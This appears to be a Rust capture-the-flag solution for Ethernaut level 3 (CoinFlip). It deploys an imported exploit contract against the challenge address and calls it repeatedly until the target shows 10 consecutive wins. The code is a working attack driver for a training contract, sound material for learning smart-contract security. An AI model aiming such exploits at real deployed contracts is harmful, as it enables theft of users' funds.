use async_trait::async_trait;
use bindings::coin_flip::CoinFlip;
use bindings::coin_flip_exploit::CoinFlipExploit;
use ctf::*;

struct EthernautLevel3Solution;

#[async_trait]
impl Solution for EthernautLevel3Solution {
    type Level = EthernautLevel3;

    async fn solve(
        self,
        challenge: &Self::Level,
        offender: Actor,
    ) -> eyre::Result<()> {
        println!("Deploying the exploit contract...");
        let exploit = CoinFlipExploit::deploy(
            offender.to_owned(),
            challenge.contract_address,
        )?
        .send()
        .await?;

        let coin_flip =
            CoinFlip::new(challenge.contract_address, offender.to_owned());

        while coin_flip.consecutive_wins().await? < 10.into() {
            println!("Flipping dat coin boiiiiiiiii");
            exploit.flip().send().await?.await?;
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[ignore]
    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        ctf::check_solution(EthernautLevel3Solution).await
    }
}
